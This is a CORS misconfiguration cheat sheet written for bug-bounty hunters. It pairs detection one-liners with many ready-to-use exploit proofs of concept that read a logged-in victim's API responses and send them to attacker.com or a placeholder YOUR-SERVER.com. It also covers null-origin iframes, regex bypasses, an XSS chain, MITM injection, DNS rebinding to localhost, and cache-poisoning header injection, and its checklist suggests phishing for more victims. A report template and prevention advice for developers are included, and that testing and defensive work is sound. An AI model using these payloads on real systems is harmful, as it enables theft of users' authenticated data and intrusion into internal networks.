


# 🎯 CORS MISCONFIGURATION  CHEAT SHEET

---

## 📋 QUICK REFERENCE (One-Liners)

```bash
# 🔍 Test any endpoint for CORS vuln:
curl -H "Origin: https://evil.com" -H "Cookie: session=TEST" https://target.com/api/data -v | grep -i "access-control"

# ✅ Vulnerable if you see BOTH:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# 🎯 Steal data with one-liner JS:
fetch("https://target.com/secret",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://attacker.com/log?d="+d))
```

---

## 🧠 CORS FUNDAMENTALS 


| Concept | What It Means | Why It Matters |
|---------|--------------|----------------|
| **Same-Origin Policy** | Browser blocks cross-domain reads by default | CORS is the "exception list" |
| **Origin** | `protocol + domain + port` (e.g., `https://app.com:443`) | Server checks this to allow/deny |
| **ACAO Header** | `Access-Control-Allow-Origin` | Tells browser which origins can read response |
| **ACAC Header** | `Access-Control-Allow-Credentials: true` | Allows cookies/auth headers in cross-origin requests |
| **Pre-flight** | `OPTIONS` request sent before "complex" requests | Can reveal misconfigurations |

> ⚠️ **Golden Rule**: If server reflects your `Origin` + sends `Credentials: true` → **YOU WIN** 🎯

---

# 🎯 VULNERABILITY PATTERNS + PoCs

---

## 🔹 Pattern 1: Origin Reflection (Most Common)

### 📌 What Happens
Server copies your `Origin` header into `Access-Control-Allow-Origin` without checking if it's trusted.

### 🔍 Detection

```bash
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=abc123" \
     https://target.com/api/secret -v
```

✅ **Vulnerable if response contains**:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### 💣 PoC #1: Basic XMLHttpRequest

```html
<!-- Save as: poc_reflection.html -->
<script>
  const TARGET = "https://TARGET.com/api/secret";  // ← CHANGE THIS
  const LOG = "https://YOUR-SERVER.com/log";        // ← CHANGE THIS

  var req = new XMLHttpRequest();
  req.onload = function() {
    // Send stolen data to your server
    fetch(LOG, {
      method: "POST",
      mode: "no-cors",
      body: "data=" + encodeURIComponent(this.responseText)
    });
  };
  req.open("GET", TARGET, true);
  req.withCredentials = true;  // ⭐ Sends victim's cookies
  req.send();
</script>
```

### 💣 PoC #2: Modern Fetch API

```javascript
// For browser console or injected JS
(async () => {
  const res = await fetch("https://TARGET.com/api/secret", {
    credentials: "include",
    headers: {"Origin": "https://evil.com"}
  });
  const data = await res.text();
  await fetch("https://YOUR-SERVER.com/log", {
    method: "POST",
    mode: "no-cors",
    body: data
  });
})();
```

### 🧪 Test with curl

```bash
# Verify the PoC works manually
curl -H "Origin: https://evil.com" \
     -H "Cookie: REAL_SESSION_COOKIE" \
     https://target.com/api/secret
# Should return sensitive data (not error)
```

---

## 🔹 Pattern 2: Null Origin Bypass

### 📌 What Happens
Server allows `Origin: null` (common in dev environments).

### 🔍 Detection

```bash
curl -H "Origin: null" \
     -H "Cookie: session=abc123" \
     https://target.com/api/secret -v
```
✅ **Vulnerable if**:
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### 💣 PoC: Sandbox Iframe + Data URI

```html
<!-- Save as: poc_null.html -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        src="data:text/html,<script>
          fetch('https://TARGET.com/api/secret', {
            credentials: 'include'
          })
          .then(r => r.text())
          .then(data => {
            // Exfiltrate data
            navigator.sendBeacon('https://YOUR-SERVER.com/log', 
                               'data=' + encodeURIComponent(data));
          });
        <\/script>">
</iframe>
```

### 💣 PoC: Sandbox Iframe + srcdoc (More Reliable)

```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
  fetch('https://TARGET.com/api/secret', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>fetch('https://YOUR-SERVER.com/log',{
      method:'POST',
      mode:'no-cors',
      body:'d='+encodeURIComponent(d)
    }));
<\/script>
"></iframe>
```

---

## 🔹 Pattern 3: Regex / Whitelist Bypass

### 📌 What Happens
Server uses weak regex or string matching to validate origins.

### 🔍 Common Bypasses Table

| Bypass Type | Payload to Test | Why It Works |
|-------------|----------------|--------------|
| **Prefix Injection** | `Origin: https://evilTARGET.com` | Regex: `.*TARGET.com` |
| **Suffix Injection** | `Origin: https://TARGET.com.evil.com` | Regex: `TARGET.com.*` |
| **Underscore Trick** | `Origin: https://TARGET_.com` | Chrome/Firefox accept `_` in domain; regex misses it |
| **Dot Not Escaped** | `Origin: https://TARGETXcom` | Regex: `TARGET.com` (dot = any char) |
| **Subdomain Takeover** | `Origin: https://compromised.TARGET.com` | Server trusts all `*.TARGET.com` |

### 🔍 Detection Script

```bash
#!/bin/bash
# cors_bypass_test.sh
TARGET="https://victim.com/api/secret"
COOKIE="session=abc123"

payloads=(
  "https://evilvictim.com"
  "https://victim.com.evil.com"
  "https://victim_.com"
  "https://victim}.com"      # Safari special char
  "https://attacker.com?victim.com"
)

for origin in "${payloads[@]}"; do
  echo "[*] Testing: $origin"
  resp=$(curl -s -H "Origin: $origin" \
              -H "Cookie: $COOKIE" \
              "$TARGET" -D - -o /dev/null)
  
  if echo "$resp" | grep -qi "Access-Control-Allow-Credentials: true"; then
    acao=$(echo "$resp" | grep -i "Access-Control-Allow-Origin" | cut -d: -f2 | tr -d ' \r')
    echo "[+] VULNERABLE! Origin: $origin → ACAO: $acao"
  fi
done
```

### 💣 PoC: For Any Bypassed Origin

```javascript
// Host this script on the bypassed domain (e.g., evilvictim.com)
fetch("https://TARGET.com/api/secret", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  fetch("https://YOUR-SERVER.com/exfil", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(data)
  });
});
```

---

## 🔹 Pattern 4: Wildcard (*) Without Credentials → Internal Network Pivot

### 📌 What Happens
Server sends `Access-Control-Allow-Origin: *` but doesn't require auth. Browser won't send cookies, but you can still read public/internal data.

### 🔍 Detection

```bash
curl -H "Origin: https://evil.com" \
     https://internal-api.local/data -v
```

✅ **Vulnerable if**:

```
Access-Control-Allow-Origin: *
# (No Credentials header needed)
```

### 💣 PoC: Read Internal API Data

```javascript
// Victim's browser acts as proxy to internal network
fetch("http://192.168.1.10/admin", {  // Internal IP
  // No credentials needed if API is unauthenticated
})
.then(r => r.text())
.then(data => {
  navigator.sendBeacon("https://YOUR-SERVER.com/exfil", data);
});
```

### 💡 Pro Tips for Internal Pivot

```bash
# Try these if 127.0.0.1 is blocked:
- 0.0.0.0          # Works on Linux/Mac
- [::1]           # IPv6 localhost
- Router's public IP from inside network
- DNS rebinding (see Pattern 7)
```

---

## 🔹 Pattern 5: Trusted Origin + XSS Chain

### 📌 What Happens
Server trusts `subdomain.target.com`, but that subdomain has XSS.

### 🔍 Detection Flow

```
1. Find trusted origins: 
   curl -H "Origin: https://sub.target.com" https://target.com/api -v | grep ACAO

2. Test subdomain for XSS:
   https://sub.target.com/search?q=<script>alert(1)</script>

3. If both true → CHAIN THEM 🔗
```

### 💣 PoC: XSS + CORS Chain Payload

```javascript
// Inject this via XSS on trusted subdomain
// URL: https://sub.target.com/page?xss=<script>...

fetch("https://MAIN.target.com/api/admin", {
  credentials: "include",  // Victim's cookies for main domain
  headers: {"Origin": "https://sub.target.com"}  // Trusted origin
})
.then(r => r.json())
.then(data => {
  fetch("https://YOUR-SERVER.com/steal", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify({
      source: document.location.href,
      data: data
    })
  });
});
```

### 💣 One-Liner for URL Injection

```javascript
// For ?xss= parameter injection
javascript:fetch('https://MAIN.target.com/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://YOUR-SERVER.com/log?d='+encodeURIComponent(d)))
```

---

## 🔹 Pattern 6: Insecure Protocol Trust (HTTP Subdomain)

### 📌 What Happens
Server trusts `http://sub.target.com` (not just HTTPS). Attacker intercepts HTTP traffic → injects CORS exploit.

### 🔍 Detection

```bash
# Test HTTP origin (not HTTPS)
curl -H "Origin: http://sub.target.com" \
     -H "Cookie: session=abc" \
     https://target.com/api/secret -v
```

✅ **Vulnerable if**:

```
Access-Control-Allow-Origin: http://sub.target.com
Access-Control-Allow-Credentials: true
```

### 💣 PoC: MITM + Redirect + CORS Steal

```html
<!-- Attacker's MITM page (after intercepting HTTP request) -->
<script>
  // Redirect victim to trusted HTTP subdomain with malicious payload
  document.location = "http://sub.target.com/search?" +
    "q=<script>" +
      "fetch('https://target.com/api/secret',{credentials:'include'})" +
      ".then(r=>r.text())" +
      ".then(d=>navigator.sendBeacon('https://YOUR-SERVER.com/log',d))" +
    "<\/script>";
</script>
```

### 🧪 Manual Test Steps

```
1. Victim visits http://target.com (unencrypted)
2. You (MITM) inject redirect to: 
   http://sub.target.com/?xss=<CORS-EXPLOIT>
3. Victim's browser executes exploit from trusted origin
4. Data stolen via CORS ✅
```

---

## 🔹 Pattern 7: DNS Rebinding for localhost/Internal Access

### 📌 What Happens
Attacker controls DNS for `attacker.com`. First request → attacker server (serves payload). Second request (after TTL) → 127.0.0.1. Browser keeps same origin → bypasses SOP.

### 🔍 Quick Test

```bash
# Use public rebinding service
# Visit: https://lock.cmpxchg8b.com/rebinder.html?rebind=127.0.0.1

# Or test manually:
# 1. Set DNS A record: attacker.com → YOUR_SERVER_IP
# 2. Serve payload that requests attacker.com again after delay
# 3. Change DNS: attacker.com → 127.0.0.1
# 4. Payload now talks to localhost with original origin
```

### 💣 PoC: DNS Rebinding + CORS Steal

```html
<!-- Host on attacker.com (with fast TTL DNS) -->
<script>
  // First load: serve this script from attacker.com (your server)
  // After DNS rebinds to 127.0.0.1, this request goes to localhost
  
  setTimeout(() => {
    fetch("http://attacker.com:8080/admin", {  // Now resolves to 127.0.0.1
      credentials: "include",
      headers: {"Origin": "https://attacker.com"}  // Still same origin
    })
    .then(r => r.text())
    .then(data => {
      // Exfiltrate via image beacon (bypasses CORS on exfil)
      new Image().src = "https://YOUR-SERVER.com/log?d=" + encodeURIComponent(data);
    });
  }, 5000);  // Wait for DNS cache to expire
</script>
```

### 🛠️ Tools for DNS Rebinding

```bash
# Public service (easy):
https://lock.cmpxchg8b.com/rebinder.html?rebind=127.0.0.1

# Self-hosted (advanced):
git clone https://github.com/mogwailabs/DNSrebinder
# Configure: A record → your server, NS record → your DNS server
```

---

## 🔹 Pattern 8: Cache Poisoning via CORS + Missing Vary Header

### 📌 What Happens
Server caches responses without `Vary: Origin`. Attacker sends malicious Origin → cached response served to all users.

### 🔍 Detection

```bash
# Check if Vary: Origin is missing
curl -I https://target.com/api/data | grep -i vary
# If NO "Vary: Origin" → potential cache poisoning
```

### 💣 PoC: Client-Side Cache Poisoning

```javascript
// Inject this via any XSS or malicious page
fetch("https://target.com/api/data", {
  headers: {
    "Origin": "https://evil.com",
    "X-Custom-Header": "<svg/onload=alert(1)>"  // Malicious payload
  }
})
.then(() => {
  // Navigate to target URL → may load cached poisoned response
  document.location = "https://target.com/api/data";
});
```

### 💣 PoC: Server-Side Header Injection (IE/Edge only)

```http
# Malicious request (send via Burp/Repeater):
GET /api/data HTTP/1.1
Host: target.com
Origin: z\r\nContent-Type: text/html; charset=UTF-7

# If server reflects Origin unsanitized + caches response:
# IE/Edge may parse \r\n as header end → header injection → cached XSS
```

---

# 🔍 DISCOVERY METHODOLOGY (Step-by-Step)

## Phase 1: Recon

```bash
# 1. Find API endpoints
gau target.com | grep -i api > endpoints.txt
# OR: Browse app → check Network tab → copy endpoints

# 2. Get valid session cookie
# Login to target.com → copy "Cookie:" header from Burp/DevTools
```

## Phase 2: Automated Scan

```bash
# Option A: Use Corsy (Python)
pip install corsy
python3 corsy.py -u https://target.com/api/endpoint -w 20

# Option B: Use CORScanner
git clone https://github.com/chenjj/CORScanner
python3 corScanner.py -u https://target.com

# Option C: Custom Bash Loop
while read url; do
  curl -s -H "Origin: https://evil.com" \
       -H "Cookie: YOUR_COOKIE" \
       "$url" -D - -o /dev/null | \
       grep -q "Access-Control-Allow-Credentials: true" && \
       echo "[+] VULNERABLE: $url"
done < endpoints.txt
```

## Phase 3: Manual Verification

```bash
# For each suspicious endpoint:
curl -v \
  -H "Origin: https://evil.com" \
  -H "Cookie: REAL_SESSION_COOKIE" \
  https://target.com/api/sensitive

# ✅ Confirm BOTH headers exist:
# Access-Control-Allow-Origin: https://evil.com  (or *)
# Access-Control-Allow-Credentials: true
```

## Phase 4: Exploit Validation

```bash
# 1. Host PoC on your server (evil.com/poc.html)
# 2. Send link to victim (or use your own logged-in browser for testing)
# 3. Check your server logs for stolen data
# 4. Document: request/response screenshots + PoC code
```

---

# 🧰 TOOLS CHEAT SHEET

| Tool            | Purpose                           | Install/Run                                     | Best For                                     |
| --------------- | --------------------------------- | ----------------------------------------------- | -------------------------------------------- |
| **Burp Suite**  | Manual testing, Repeater, Scanner | Download from portswigger.net                   | All patterns, especially manual verification |
| **Corsy**       | Fast automated scanner            | `pip install corsy` + `python3 corsy.py -u URL` | Pattern 1,2,3 bulk scanning                  |
| **CORScanner**  | Advanced misconfig detection      | `git clone + python3 corScanner.py -u URL`      | Regex bypasses, null origin                  |
| **theftfuzzer** | CORS + CSRF combined testing      | `git clone + python3 theftfuzzer.py`            | Chained attacks                              |
| **CorsMe**      | Interactive testing UI            | `git clone + run web interface`                 | Learning + manual testing                    |
| **DNSrebinder** | Self-hosted DNS rebinding         | `git clone + configure DNS`                     | Pattern 7 (internal access)                  |


### 🔧 Burp Suite Pro Tips

```
✅ Use "Match and Replace" to auto-add Origin header:
   Match: ^GET.*  → Replace: $0\nOrigin: https://evil.com

✅ Use "Logger++" to filter responses containing "Access-Control-Allow-Credentials"

✅ Use "Scanner" with custom payload: 
   Payload: Origin: https://evil.com
   Check: Response contains "Access-Control-Allow-Origin: https://evil.com"
```

### 🔧 curl One-Liners for Quick Testing

```bash
# Test basic reflection
curl -s -H "Origin: https://evil.com" -H "Cookie: session=TEST" https://target.com/api -D - -o /dev/null | grep -i "access-control"

# Test null origin
curl -s -H "Origin: null" -H "Cookie: session=TEST" https://target.com/api -D - -o /dev/null | grep -i "allow-origin.*null"

# Test wildcard + internal
curl -s -H "Origin: https://evil.com" http://192.168.1.10/api -D - -o /dev/null | grep "Allow-Origin: \*"

# Check for Vary header (cache poisoning risk)
curl -sI https://target.com/api | grep -i vary
```

---

# 📝 REPORTING TEMPLATE (HackerOne Style)

```markdown
# CORS Misconfiguration on [ENDPOINT] Allows Authenticated Data Exfiltration

## Summary
The endpoint `[URL]` reflects arbitrary `Origin` headers in `Access-Control-Allow-Origin` 
while also sending `Access-Control-Allow-Credentials: true`. This allows any website 
to read sensitive user data via a victim's browser session.

## Steps to Reproduce
1. Login to target.com as any user
2. Send request to `[ENDPOINT]` with header: `Origin: https://evil.com`
3. Observe response headers:
   ```
   Access-Control-Allow-Origin: https://evil.com
   Access-Control-Allow-Credentials: true
   ```
4. Host the PoC (below) on evil.com
5. Visit evil.com/poc.html while logged into target.com
6. Data is exfiltrated to attacker's server

## Proof of Concept
```html
<!-- poc.html -->
<script>
  fetch("https://TARGET.com/ENDPOINT", {credentials:"include"})
    .then(r=>r.text())
    .then(d=>fetch("https://ATTACKER.com/log?d="+encodeURIComponent(d)));
</script>
```

## Impact
- ✅ Steal user's [API keys / PII / session tokens]
- ✅ Perform actions on behalf of victim (if endpoint is state-changing)
- ✅ Chain with XSS/phishing for wider impact
- CVSS Estimate: 7.5 (High)

## Remediation
1. Replace dynamic Origin reflection with strict whitelist:
   ```python
   ALLOWED_ORIGINS = ["https://app.target.com", "https://admin.target.com"]
   if origin in ALLOWED_ORIGINS:
       response.headers["Access-Control-Allow-Origin"] = origin
   ```
2. Never combine `*` with `Access-Control-Allow-Credentials: true`
3. Add `Vary: Origin` header to prevent cache poisoning
4. Validate `Host` header + enforce HTTPS internally

## References
-  [CORS bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [HackTricks]([https://hacktricks.wiki/en/index.html#hacktricks](https://hacktricks.wiki/en/pentesting-web/cors-bypass.html))


### ✅ Report Submission Checklist

```
[ ] Tested with REAL session cookie (not fake/test)
[ ] Included request/response screenshots from Burp
[ ] Provided working PoC (hosted or code snippet)
[ ] Explained business impact (not just technical)
[ ] Suggested specific, actionable fixes
[ ] Used professional tone (no "you guys messed up")

```

---

# 🛡️ PREVENTION CHECKLIST (For Developers)

```yaml
✅ DO:
  - Use strict whitelist of trusted origins (no regex tricks)
  - Never reflect Origin header without validation
  - Always add: Vary: Origin
  - Block null origin in production
  - Use HTTPS everywhere (including subdomains)
  - Validate Host header + implement CSP
  - Test CORS config with automated scanners pre-deploy

❌ DON'T:
  - Use: if (origin.includes("target.com")) → too weak!
  - Combine: Access-Control-Allow-Origin: * + Credentials: true
  - Trust client-side checks only
  - Forget preflight checks for sensitive endpoints
  - Allow HTTP origins if main site uses HTTPS

🔧 Code Example (Secure CORS in Express.js):
const ALLOWED = ["https://app.target.com", "https://admin.target.com"];
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.includes(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Vary", "Origin");  // Prevent cache poisoning
  }
  next();
});
```

---

# 🧠 HACKER MINDSET CHECKLIST

Before submitting a CORS report, ask:

```
🔍 Is it exploitable?
   [ ] Does response contain sensitive data? (not just "ok")
   [ ] Can I steal it with a browser? (not just curl)
   [ ] Does it work with real user session? (not anonymous)

🎯 What's the impact?
   [ ] Read-only data leak? → Medium
   [ ] Account takeover possible? → High
   [ ] Internal network access? → Critical

🔗 Can I chain it?
   [ ] With XSS on trusted subdomain?
   [ ] With CSRF for state-changing actions?
   [ ] With phishing for wider victim pool?

📝 Is my report clear?
   [ ] Steps work on fresh browser?
   [ ] PoC is copy-paste ready?
   [ ] Impact explained in business terms?
```

---

